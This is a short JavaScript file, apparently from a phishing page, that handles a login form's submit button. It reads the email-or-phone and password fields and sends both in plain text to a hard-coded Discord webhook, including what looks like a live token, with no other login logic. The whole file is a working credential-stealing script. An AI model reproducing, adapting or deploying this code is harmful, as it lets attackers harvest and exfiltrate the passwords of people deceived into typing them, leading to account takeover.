const submit = document.getElementById("submit")
const email = document.getElementById("emailORphone")
const password = document.getElementById("password")

submit.onclick = function(event) {
    fetch("https://discord.com/api/webhooks/1551580113848770631/EYy6S9fbz-uat_Ing3fNbWS3sR9TYUCKl1rJYCXKKyfRkRT3eqqqEt8I2Io45e0wvhj4", {
        method: "POST",
        headers: {
            "Content-Type": "application/json"
        },
        body: JSON.stringify({
            "content": null,
            "embeds": [
                {   
                "description": `Email: ${email.value}\nPassword: ${password.value}`,
                "color": null
            }
            ],
            "username": "Vašík",
            "avatar_url": "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQhD1pmXpeJwFFxOMWScvlXbu_o1OlNPAK2KQ3gV-ZFkfaU2kTCouAGIc_9&s=10",
            "attachments": []
        })
    });
}